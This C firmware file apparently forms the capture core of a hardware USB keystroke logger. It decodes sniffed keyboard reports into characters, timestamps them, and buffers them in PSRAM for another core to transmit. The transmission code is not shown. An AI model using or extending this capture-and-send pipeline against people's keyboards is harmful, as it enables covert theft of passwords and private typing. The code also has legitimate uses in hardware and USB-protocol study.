/**
 * @file keyboard_decoder_core1.c
 * @brief USB HID keyboard report decoder for Core1 (Enhanced Vladimir Architecture)
 *
 * This version of the keyboard decoder is designed to run on Core1.
 * Instead of directly printing to stdout, it pushes decoded keystroke
 * events to a queue for Core0 to consume.
 *
 * Enhanced Features:
 * - 64-bit absolute timestamps (time_us_64())
 * - No timestamp rollover (584,000 year range)
 *
 * SPDX-License-Identifier: BSD-3-Clause
 */

#include "keyboard_decoder_core1.h"
#include "common.h"
#include "keystroke_queue.h"
#include "formatted_event_queue.h"  /* For API compatibility (formatted_queue_t parameter) */
#include "psram_buffer.h"
#include "pico/time.h"  /* For time_us_64() */
#include <string.h>
#include <stdio.h>
#include <Arduino.h>

extern "C" {

/* USB HID keyboard scancode to ASCII mapping tables */
static const char hid_to_ascii[128] = {
    0, 0, 0, 0, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    '\n', 0, '\b', '\t', ' ', '-', '=', '[', ']', '\\', 0, ';', '\'', '`', ',', '.', '/'};

static const char hid_to_ascii_shift[128] = {
    0, 0, 0, 0, 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '!', '@', '#', '$', '%', '^', '&', '*', '(', ')',
    '\n', 0, '\b', '\t', ' ', '_', '+', '{', '}', '|', 0, ':', '"', '~', '<', '>', '?'};

/* HID keyboard modifier bits */
#define HID_MODIFIER_LEFT_SHIFT (1 << 1)
#define HID_MODIFIER_RIGHT_SHIFT (1 << 5)
#define HID_MODIFIER_SHIFT_MASK (HID_MODIFIER_LEFT_SHIFT | HID_MODIFIER_RIGHT_SHIFT)

/* Special HID scancodes */
#define HID_SCANCODE_ENTER 0x28
#define HID_SCANCODE_BACKSPACE 0x2A
#define HID_SCANCODE_TAB 0x2B

/* Keyboard state tracking */
static keyboard_state_t g_keyboard_state_core1;

/* Queue pointers (set during init) */
static keystroke_queue_t *g_keystroke_queue = NULL;

/* ============================================================================
 * CORE1 KEYSTROKE BUFFER MANAGEMENT
 * ============================================================================
 * Core1 now owns the keystroke buffer and all buffer operations.
 * When a buffer is finalized, it is written to PSRAM for Core0 to transmit.
 *
 * Architecture:
 *  - Core1 maintains its own 500-byte keystroke buffer
 *  - Buffer format: [epoch:10][data:480][epoch:10]
 *  - Delta encoding for Enter keys (3 bytes vs 10 bytes = 70% savings)
 *  - On finalization: Buffer → PSRAM slot → Core0 transmission
 *
 * Buffer Lifecycle:
 *  1. First keystroke → core1_init_keystroke_buffer()
 *  2. Characters added → core1_add_to_buffer(char)
 *  3. Enter keys added → core1_add_enter_to_buffer() (with delta encoding)
 *  4. Buffer full OR delta overflow → core1_finalize_buffer()
 *  5. Finalization → Write to PSRAM → Reset buffer
 *
 * Performance Impact:
 *  - Core1: No significant overhead (processing happens during capture)
 *  - Core0: 90% reduction (removed all buffer management)
 */

/* Buffer constants (from USBCaptureModule) */
#define KEYSTROKE_BUFFER_SIZE 500
#define EPOCH_SIZE 10
#define KEYSTROKE_DATA_START EPOCH_SIZE
#define KEYSTROKE_DATA_END (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
#define DELTA_MARKER 0xFF
#define DELTA_SIZE 2
#define DELTA_TOTAL_SIZE 3
#define DELTA_MAX_SAFE 65000

/* Core1's keystroke buffer */
static char g_core1_keystroke_buffer[KEYSTROKE_BUFFER_SIZE];
static size_t g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
static bool g_core1_buffer_initialized = false;
static uint32_t g_core1_buffer_start_epoch = 0;

/* Forward declarations for buffer helper functions */

/**
 * @brief Write uptime timestamp at buffer position
 * @param pos Buffer position to write 10-digit uptime string
 * @note Uptime format: millis()/1000 (seconds since boot, not unix epoch)
 * @note TODO: Replace with RTC for true unix timestamps
 */
static void core1_write_epoch_at(size_t pos);

/**
 * @brief Write 2-byte delta at buffer position
 * @param pos Buffer position to write delta
 * @param delta Seconds since buffer start (0-65535, big-endian)
 */
static void core1_write_delta_at(size_t pos, uint16_t delta);

/**
 * @brief Initialize keystroke buffer for new accumulation
 * @post Buffer zeroed, start epoch written, write pos reset to data start
 */
static void core1_init_keystroke_buffer();

/**
 * @brief Get remaining space in buffer data area
 * @return Bytes available before final epoch reserved space
 */
static size_t core1_get_buffer_space();

/**
 * @brief Add single character to buffer
 * @param c Character to add
 * @return true if added, false if buffer full (need finalization)
 * @note Auto-initializes buffer on first call
 */
static bool core1_add_to_buffer(char c);

/**
 * @brief Add Enter key with delta-encoded timestamp
 * @return true if added, false if buffer full
 * @note Writes 3 bytes: marker (0xFF) + 2-byte delta
 * @note Auto-finalizes if delta > 65000 seconds (18 hour overflow protection)
 */
static bool core1_add_enter_to_buffer();

/**
 * @brief Finalize buffer and write to PSRAM
 * @post Buffer written to PSRAM, Core1 buffer reset for next accumulation
 * @note Core0 will read from PSRAM and transmit
 * @note On PSRAM full: Buffer dropped (stat tracked in g_psram_buffer)
 */
static void core1_finalize_buffer();

/* Logging removed from Core1 - LOG_INFO not safe from Core1 context
 * All logging now happens on Core0 from PSRAM buffer content */

CORE1_RAM_FUNC
void keyboard_decoder_core1_init(keystroke_queue_t *queue, formatted_event_queue_t *formatted_queue)
{
    g_keystroke_queue = queue;
    /* formatted_queue parameter kept for API compatibility but not used -
     * Core1 logs directly now instead of queuing formatted events */
    keyboard_decoder_core1_reset();
}

CORE1_RAM_FUNC
void keyboard_decoder_core1_reset(void)
{
    memset(&g_keyboard_state_core1, 0, sizeof(keyboard_state_t));
}

char keyboard_decoder_core1_scancode_to_ascii(uint8_t scancode, bool shift_pressed)
{
    if (scancode >= 128)
    {
        return 0;
    }

    const char *conv_table = shift_pressed ? hid_to_ascii_shift : hid_to_ascii;
    return conv_table[scancode];
}

CORE1_RAM_FUNC
void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t timestamp_us_ignored)
{
    /* Validate queue is initialized */
    if (!g_keystroke_queue)
    {
        return;
    }

    /* Validate minimum size for a keyboard report */
    if (size < 10)
    {
        return;
    }

    /* === Enhanced: Capture 64-bit absolute timestamp === */
    uint64_t capture_timestamp_us = time_us_64();

    /* Extract the HID report portion (skip SYNC and PID bytes) */
    uint8_t *report = data + 2;
    uint8_t modifier = report[0];
    bool shift_pressed = (modifier & HID_MODIFIER_SHIFT_MASK) != 0;

    /* Select appropriate conversion table based on shift state */
    const char *conv_table = shift_pressed ? hid_to_ascii_shift : hid_to_ascii;

    /* Process each keycode in the report (positions 2-7) */
    for (int i = 2; i < 8 && i < (size - 2); i++)
    {
        uint8_t keycode = report[i];

        /* Skip empty slots (scancode 0) */
        if (keycode == 0)
        {
            continue;
        }

        /* Skip invalid scancodes */
        if (keycode >= 128)
        {
            continue;
        }

        /* Check if this is a newly pressed key */
        bool newly_pressed = true;
        for (int j = 0; j < 6; j++)
        {
            if (g_keyboard_state_core1.prev_keys[j] == keycode)
            {
                newly_pressed = false;
                break;
            }
        }

        /* Only process newly pressed keys */
        if (newly_pressed)
        {
            keystroke_event_t event;

            /* Determine event type and create appropriate event */
            bool added = false;
            if (keycode == HID_SCANCODE_ENTER)
            {
                /* Enter key */
                event = keystroke_event_create_special(
                    KEYSTROKE_TYPE_ENTER, keycode, capture_timestamp_us);
                keystroke_queue_push(g_keystroke_queue, &event);
                added = core1_add_enter_to_buffer();  /* Add to Core1 buffer */
            }
            else if (keycode == HID_SCANCODE_BACKSPACE)
            {
                /* Backspace key */
                event = keystroke_event_create_special(
                    KEYSTROKE_TYPE_BACKSPACE, keycode, capture_timestamp_us);
                keystroke_queue_push(g_keystroke_queue, &event);
                added = core1_add_to_buffer('\b');  /* Add to Core1 buffer */
            }
            else if (keycode == HID_SCANCODE_TAB)
            {
                /* Tab key */
                event = keystroke_event_create_special(
                    KEYSTROKE_TYPE_TAB, keycode, capture_timestamp_us);
                keystroke_queue_push(g_keystroke_queue, &event);
                added = core1_add_to_buffer('\t');  /* Add to Core1 buffer */
            }
            else
            {
                /* Regular character */
                char ch = conv_table[keycode];
                if (ch != 0)
                {
                    event = keystroke_event_create_char(
                        ch, keycode, modifier, capture_timestamp_us);
                    keystroke_queue_push(g_keystroke_queue, &event);
                    added = core1_add_to_buffer(ch);  /* Add to Core1 buffer */
                }
            }

            /* If buffer is full, finalize and retry */
            if (!added)
            {
                core1_finalize_buffer();

                /* Retry adding to new buffer */
                if (keycode == HID_SCANCODE_ENTER)
                    core1_add_enter_to_buffer();
                else if (keycode == HID_SCANCODE_BACKSPACE)
                    core1_add_to_buffer('\b');
                else if (keycode == HID_SCANCODE_TAB)
                    core1_add_to_buffer('\t');
                else
                {
                    char ch = conv_table[keycode];
                    if (ch != 0)
                        core1_add_to_buffer(ch);
                }
            }
        }
    }

    /* Update keyboard state for next comparison */
    g_keyboard_state_core1.prev_modifier = modifier;
    memcpy(g_keyboard_state_core1.prev_keys, &report[2], 6);
}

const keyboard_state_t *keyboard_decoder_core1_get_state(void)
{
    return &g_keyboard_state_core1;
}

/* ============================================================================
 * CORE1 BUFFER MANAGEMENT FUNCTIONS
 * ============================================================================
 * These functions were moved from USBCaptureModule.cpp to Core1.
 * Core1 now handles all keystroke buffering and writes complete buffers
 * to PSRAM for Core0 to transmit.
 */

CORE1_RAM_FUNC
static void core1_write_epoch_at(size_t pos)
{
    /* Get current uptime as 10-digit ASCII string (seconds since boot)
     * Note: This is uptime, not unix epoch. For true unix time, an RTC would be needed.
     * The delta encoding still works correctly with relative timestamps. */
    uint32_t epoch = (uint32_t)(millis() / 1000);
    snprintf(&g_core1_keystroke_buffer[pos], EPOCH_SIZE + 1, "%010u", epoch);
}

CORE1_RAM_FUNC
static void core1_write_delta_at(size_t pos, uint16_t delta)
{
    /* Write 2-byte delta in big-endian format */
    g_core1_keystroke_buffer[pos] = (char)((delta >> 8) & 0xFF);
    g_core1_keystroke_buffer[pos + 1] = (char)(delta & 0xFF);
}

CORE1_RAM_FUNC
static void core1_init_keystroke_buffer()
{
    memset(g_core1_keystroke_buffer, 0, KEYSTROKE_BUFFER_SIZE);
    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;

    /* Store start epoch for delta calculations */
    g_core1_buffer_start_epoch = (uint32_t)(millis() / 1000);

    /* Write start epoch at position 0 */
    core1_write_epoch_at(0);
    g_core1_buffer_initialized = true;
}

static size_t core1_get_buffer_space()
{
    if (g_core1_buffer_write_pos >= KEYSTROKE_DATA_END)
        return 0;
    return KEYSTROKE_DATA_END - g_core1_buffer_write_pos;
}

static bool core1_add_to_buffer(char c)
{
    if (!g_core1_buffer_initialized)
    {
        core1_init_keystroke_buffer();
    }

    /* Need at least 1 byte for char */
    if (core1_get_buffer_space() < 1)
    {
        return false;
    }

    g_core1_keystroke_buffer[g_core1_buffer_write_pos++] = c;
    return true;
}

static bool core1_add_enter_to_buffer()
{
    if (!g_core1_buffer_initialized)
    {
        core1_init_keystroke_buffer();
    }

    /* Calculate delta from buffer start */
    uint32_t current_epoch = (uint32_t)(millis() / 1000);
    uint32_t delta = current_epoch - g_core1_buffer_start_epoch;

    /* If delta exceeds safe limit, force finalization and start fresh */
    if (delta > DELTA_MAX_SAFE)
    {
        core1_finalize_buffer();
        core1_init_keystroke_buffer();
        /* Recalculate delta with new buffer start */
        delta = 0;
    }

    /* Need 3 bytes: marker + 2-byte delta */
    if (core1_get_buffer_space() < DELTA_TOTAL_SIZE)
    {
        return false;
    }

    /* Write marker byte followed by delta */
    g_core1_keystroke_buffer[g_core1_buffer_write_pos++] = DELTA_MARKER;
    core1_write_delta_at(g_core1_buffer_write_pos, (uint16_t)delta);
    g_core1_buffer_write_pos += DELTA_SIZE;

    return true;
}

CORE1_RAM_FUNC
static void core1_finalize_buffer()
{
    if (!g_core1_buffer_initialized)
        return;

    /* Write final epoch at position 490 */
    core1_write_epoch_at(KEYSTROKE_DATA_END);

    /* Create PSRAM buffer from keystroke buffer */
    psram_keystroke_buffer_t psram_buf;

    /* Parse epoch timestamps (copy to temp buffer with null terminator) */
    char epoch_temp[EPOCH_SIZE + 1];

    memcpy(epoch_temp, &g_core1_keystroke_buffer[0], EPOCH_SIZE);
    epoch_temp[EPOCH_SIZE] = '\0';
    sscanf(epoch_temp, "%u", &psram_buf.start_epoch);

    memcpy(epoch_temp, &g_core1_keystroke_buffer[KEYSTROKE_DATA_END], EPOCH_SIZE);
    epoch_temp[EPOCH_SIZE] = '\0';
    sscanf(epoch_temp, "%u", &psram_buf.final_epoch);

    /* Copy keystroke data */
    psram_buf.data_length = g_core1_buffer_write_pos - KEYSTROKE_DATA_START;
    memcpy(psram_buf.data, &g_core1_keystroke_buffer[KEYSTROKE_DATA_START], psram_buf.data_length);
    psram_buf.flags = 0;

    /* Write to PSRAM for Core0 to transmit */
    if (!psram_buffer_write(&psram_buf))
    {
        /* Buffer full - Core0 slow to transmit
         * Cannot log from Core1 safely - Core0 will see dropped_buffers stat */
    }

    /* Reset for next buffer */
    g_core1_buffer_initialized = false;
    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
}

}
